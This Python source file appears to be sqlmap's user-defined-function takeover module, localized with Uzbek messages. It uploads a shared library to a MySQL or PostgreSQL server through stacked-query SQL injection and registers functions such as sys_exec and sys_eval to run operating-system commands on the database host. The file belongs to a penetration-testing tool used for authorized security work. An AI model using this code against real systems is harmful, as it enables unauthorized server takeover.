#!/usr/bin/env python

"""
Copyright (c) 2006-2026 sqlmap developers (https://sqlmap.org)
See the file 'LICENSE' for copying permission
"""

from lib.core.uzbek import ut
import os

from lib.core.agent import agent
from lib.core.common import Backend
from lib.core.common import checkFile
from lib.core.common import dataToStdout
from lib.core.common import isDigit
from lib.core.common import isStackingAvailable
from lib.core.common import readInput
from lib.core.common import unArrayizeValue
from lib.core.compat import xrange
from lib.core.data import conf
from lib.core.data import logger
from lib.core.data import queries
from lib.core.enums import CHARSET_TYPE
from lib.core.enums import DBMS
from lib.core.enums import EXPECTED
from lib.core.enums import OS
from lib.core.exception import SqlmapFilePathException
from lib.core.exception import SqlmapMissingMandatoryOptionException
from lib.core.exception import SqlmapUnsupportedFeatureException
from lib.core.exception import SqlmapUserQuitException
from lib.core.unescaper import unescaper
from lib.request import inject

class UDF(object):
    """
    This class defines methods to deal with User-Defined Functions for
    plugins.
    """

    def __init__(self):
        self.createdUdf = set()
        self.udfs = {}
        self.udfToCreate = set()

    def _askOverwriteUdf(self, udf):
        message = ut("UDF '%s' already exists, do you ", "'%s' UDF allaqachon mavjud, ") % udf
        message += ut('want to overwrite it? [y/N] ', 'ustidan yozilsinmi? [y/N] ')

        return readInput(message, default='N', boolean=True)

    def _checkExistUdf(self, udf):
        logger.info("'%s' UDF mavjudligi tekshirilmoqda" % udf)

        query = agent.forgeCaseStatement(queries[Backend.getIdentifiedDbms()].check_udf.query % (udf, udf))
        return inject.getValue(query, resumeValue=False, expected=EXPECTED.BOOL, charsetType=CHARSET_TYPE.BINARY)

    def udfCheckAndOverwrite(self, udf):
        exists = self._checkExistUdf(udf)
        overwrite = True

        if exists:
            overwrite = self._askOverwriteUdf(udf)

        if overwrite:
            self.udfToCreate.add(udf)

    def udfCreateSupportTbl(self, dataType):
        debugMsg = 'foydalanuvchi funksiyalari uchun yordamchi jadval yaratilmoqda'
        logger.debug(debugMsg)

        self.createSupportTbl(self.cmdTblName, self.tblField, dataType)

    def udfForgeCmd(self, cmd):
        if not cmd.startswith("'"):
            cmd = "'%s" % cmd

        if not cmd.endswith("'"):
            cmd = "%s'" % cmd

        return cmd

    def udfExecCmd(self, cmd, silent=False, udfName=None):
        if udfName is None:
            udfName = "sys_exec"

        cmd = unescaper.escape(self.udfForgeCmd(cmd))

        return inject.goStacked("SELECT %s(%s)" % (udfName, cmd), silent)

    def udfEvalCmd(self, cmd, first=None, last=None, udfName=None):
        if udfName is None:
            udfName = "sys_eval"

        if conf.direct:
            output = self.udfExecCmd(cmd, udfName=udfName)

            if output and isinstance(output, (list, tuple)):
                new_output = ""

                for line in output:
                    new_output += line.replace("\r", "\n")

                output = new_output
        else:
            cmd = unescaper.escape(self.udfForgeCmd(cmd))

            inject.goStacked("INSERT INTO %s(%s) VALUES (%s(%s))" % (self.cmdTblName, self.tblField, udfName, cmd))
            output = unArrayizeValue(inject.getValue("SELECT %s FROM %s" % (self.tblField, self.cmdTblName), resumeValue=False, firstChar=first, lastChar=last, safeCharEncode=False))
            inject.goStacked("DELETE FROM %s" % self.cmdTblName)

        return output

    def udfCheckNeeded(self):
        if (not any((conf.fileRead, conf.commonFiles)) or (any((conf.fileRead, conf.commonFiles)) and not Backend.isDbms(DBMS.PGSQL))) and "sys_fileread" in self.sysUdfs:
            self.sysUdfs.pop("sys_fileread")

        if not conf.osPwn:
            self.sysUdfs.pop("sys_bineval")

        if not conf.osCmd and not conf.osShell and not conf.regRead:
            self.sysUdfs.pop("sys_eval")

            if not conf.osPwn and not conf.regAdd and not conf.regDel:
                self.sysUdfs.pop("sys_exec")

    def udfSetRemotePath(self):
        errMsg = 'udfSetRemotePath() metodi plagin ichida aniqlanishi kerak'
        raise SqlmapUnsupportedFeatureException(errMsg)

    def udfSetLocalPaths(self):
        errMsg = 'udfSetLocalPaths() metodi plagin ichida aniqlanishi kerak'
        raise SqlmapUnsupportedFeatureException(errMsg)

    def udfCreateFromSharedLib(self, udf, inpRet):
        errMsg = 'udfCreateFromSharedLib() metodi plagin ichida aniqlanishi kerak'
        raise SqlmapUnsupportedFeatureException(errMsg)

    def udfInjectCore(self, udfDict):
        written = False

        for udf in udfDict.keys():
            if udf in self.createdUdf:
                continue

            self.udfCheckAndOverwrite(udf)

        if len(self.udfToCreate) > 0:
            self.udfSetRemotePath()
            checkFile(self.udfLocalFile)
            written = self.writeFile(self.udfLocalFile, self.udfRemoteFile, "binary", forceCheck=True)

            if written is not True:
                errMsg = 'umumiy kutubxonani yuklashda muammo, '
                errMsg += "binar fayl yozilmaganga o'xshaydi: "
                errMsg += 'baza joylashgan fayl tizimiga'
                logger.error(errMsg)

                message = ut('do you want to proceed anyway? Beware that the ', "baribir davom etasizmi? E'tibor bering, ")
                message += ut('operating system takeover will fail [y/N] ', 'operatsion tizimni boshqarish amalga oshmaydi [y/N] ')

                if readInput(message, default='N', boolean=True):
                    written = True
                else:
                    return False
        else:
            return True

        for udf, inpRet in udfDict.items():
            if udf in self.udfToCreate and udf not in self.createdUdf:
                self.udfCreateFromSharedLib(udf, inpRet)

        if Backend.isDbms(DBMS.MYSQL):
            supportTblType = "longtext"
        elif Backend.isDbms(DBMS.PGSQL):
            supportTblType = "text"

        self.udfCreateSupportTbl(supportTblType)

        return written

    def udfInjectSys(self):
        self.udfSetLocalPaths()
        self.udfCheckNeeded()
        return self.udfInjectCore(self.sysUdfs)

    def udfInjectCustom(self):
        if Backend.getIdentifiedDbms() not in (DBMS.MYSQL, DBMS.PGSQL):
            errMsg = 'UDF kiritish faqat MySQL va PostgreSQL da ishlaydi'
            logger.error(errMsg)
            return

        if not isStackingAvailable() and not conf.direct:
            errMsg = 'UDF kiritish uchun stacked queries SQL-inyeksiyasi kerak'
            logger.error(errMsg)
            return

        self.checkDbmsOs()

        if not self.isDba():
            warnMsg = "so'ralgan funksiya ishlamasligi mumkin, chunki "
            warnMsg += 'joriy sessiya foydalanuvchisi baza administratori emas'
            logger.warning(warnMsg)

        if not conf.shLib:
            msg = ut('what is the local path of the shared library? ', "umumiy kutubxonaning mahalliy yo'li qanday? ")

            while True:
                self.udfLocalFile = readInput(msg, default=None, checkBatch=False)

                if self.udfLocalFile:
                    break
                else:
                    logger.warning("umumiy kutubxonaning mahalliy yo'lini ko'rsating")
        else:
            self.udfLocalFile = conf.shLib

        if not os.path.exists(self.udfLocalFile):
            errMsg = "ko'rsatilgan umumiy kutubxona fayli mavjud emas"
            raise SqlmapFilePathException(errMsg)

        if not self.udfLocalFile.endswith(".dll") and not self.udfLocalFile.endswith(".so"):
            errMsg = "umumiy kutubxona fayli '.dll' yoki '.so' bilan tugashi kerak"
            raise SqlmapMissingMandatoryOptionException(errMsg)

        elif self.udfLocalFile.endswith(".so") and Backend.isOs(OS.WINDOWS):
            errMsg = 'umumiy kutubxona sifatida shared object berilgan, ammo '
            errMsg += 'baza joylashgan operatsion tizim Windows'
            raise SqlmapMissingMandatoryOptionException(errMsg)

        elif self.udfLocalFile.endswith(".dll") and Backend.isOs(OS.LINUX):
            errMsg = 'umumiy kutubxona sifatida DLL berilgan, '
            errMsg += 'ammo baza joylashgan operatsion tizim Linux'
            raise SqlmapMissingMandatoryOptionException(errMsg)

        self.udfSharedLibName = os.path.splitext(os.path.basename(self.udfLocalFile))[0]
        self.udfSharedLibExt = os.path.splitext(self.udfLocalFile)[1][1:]

        msg = ut('how many user-defined functions do you want to create ', 'nechta foydalanuvchi funksiyasi yaratilsin ')
        msg += ut('from the shared library? ', 'umumiy kutubxonadan? ')

        while True:
            udfCount = readInput(msg, default='1')

            if udfCount.isdigit():
                udfCount = int(udfCount)

                if udfCount <= 0:
                    logger.info("kiritiladigan hech narsa yo'q")
                    return
                else:
                    break
            else:
                logger.warning("noto'g'ri qiymat, faqat raqamlar mumkin")

        for x in xrange(0, udfCount):
            while True:
                msg = ut('what is the name of the UDF number %d? ', '%d-raqamli UDF nomi qanday? ') % (x + 1)
                udfName = readInput(msg, default=None, checkBatch=False)

                if udfName:
                    self.udfs[udfName] = {}
                    break
                else:
                    logger.warning("UDF nomini ko'rsating")

            if Backend.isDbms(DBMS.MYSQL):
                defaultType = "string"
            elif Backend.isDbms(DBMS.PGSQL):
                defaultType = "text"

            self.udfs[udfName]["input"] = []

            msg = ut('how many input parameters takes UDF ', 'UDF nechta kirish parametrini oladi: ')
            msg += ut("'%s'? (default: 1) ", "'%s'? (standart: 1) ") % udfName

            while True:
                parCount = readInput(msg, default='1')

                if parCount.isdigit() and int(parCount) >= 0:
                    parCount = int(parCount)
                    break

                else:
                    logger.warning("noto'g'ri qiymat, faqat 0 yoki undan katta raqamlar mumkin")

            for y in xrange(0, parCount):
                msg = ut('what is the data-type of input parameter ', "kirish parametrining ma'lumot turi qanday: ")
                msg += ut('number %d? (default: %s) ', 'raqami %d? (standart: %s) ') % ((y + 1), defaultType)

                while True:
                    parType = readInput(msg, default=defaultType).strip()

                    if parType.isdigit():
                        logger.warning("parametrning ma'lumot turini ko'rsating")

                    else:
                        self.udfs[udfName]["input"].append(parType)
                        break

            msg = ut('what is the data-type of the return ', "qaytariladigan qiymatning ma'lumot turi ")
            msg += ut('value? (default: %s) ', 'qanday? (standart: %s) ') % defaultType

            while True:
                retType = readInput(msg, default=defaultType)

                if hasattr(retType, "isdigit") and retType.isdigit():
                    logger.warning("qaytariladigan qiymatning ma'lumot turini ko'rsating")
                else:
                    self.udfs[udfName]["return"] = retType
                    break

        success = self.udfInjectCore(self.udfs)

        if success is False:
            self.cleanup(udfDict=self.udfs)
            return False

        msg = ut('do you want to call your injected user-defined ', 'kiritilgan foydalanuvchi funksiyalari ')
        msg += ut('functions now? [Y/n/q] ', 'hozir chaqirilsinmi? [Y/n/q] ')
        choice = readInput(msg, default='Y').upper()

        if choice == 'N':
            self.cleanup(udfDict=self.udfs)
            return
        elif choice == 'Q':
            self.cleanup(udfDict=self.udfs)
            raise SqlmapUserQuitException

        while True:
            udfList = []
            msg = ut('which UDF do you want to call?', 'qaysi UDF chaqirilsin?')

            for udf in self.udfs.keys():
                udfList.append(udf)
                msg += "\n[%d] %s" % (len(udfList), udf)

            msg += ut('\n[q] Quit', '\n[q] Chiqish')

            while True:
                choice = readInput(msg, default=None, checkBatch=False).upper()

                if choice == 'Q':
                    break
                elif isDigit(choice) and int(choice) > 0 and int(choice) <= len(udfList):
                    choice = int(choice)
                    break
                else:
                    warnMsg = "noto'g'ri qiymat, faqat raqamlar: >= 1 va "
                    warnMsg += "<= %d bo'lishi mumkin" % len(udfList)
                    logger.warning(warnMsg)

            if not isinstance(choice, int):
                break

            cmd = ""
            count = 1
            udfToCall = udfList[choice - 1]

            for inp in self.udfs[udfToCall]["input"]:
                msg = ut('what is the value of the parameter number ', 'parametr qiymati qanday, raqami: ')
                msg += ut('%d (data-type: %s)? ', "%d (ma'lumot turi: %s)? ") % (count, inp)

                while True:
                    parValue = readInput(msg, default=None, checkBatch=False)

                    if parValue:
                        if "int" not in inp and "bool" not in inp:
                            parValue = "'%s'" % parValue

                        cmd += "%s," % parValue

                        break
                    else:
                        logger.warning("parametr qiymatini ko'rsating")

                count += 1

            cmd = cmd[:-1]
            msg = ut('do you want to retrieve the return value of the ', 'UDF qaytaradigan qiymatni ')
            msg += ut('UDF? [Y/n] ', 'olasizmi? [Y/n] ')

            if readInput(msg, default='Y', boolean=True):
                output = self.udfEvalCmd(cmd, udfName=udfToCall)

                if output:
                    conf.dumper.string('qaytarilgan qiymat', output)
                else:
                    dataToStdout("Qaytariladigan qiymat yo'q\n")
            else:
                self.udfExecCmd(cmd, udfName=udfToCall, silent=True)

            msg = ut('do you want to call this or another injected UDF? [Y/n] ', 'shu yoki boshqa kiritilgan UDF chaqirilsinmi? [Y/n] ')

            if not readInput(msg, default='Y', boolean=True):
                break

        self.cleanup(udfDict=self.udfs)
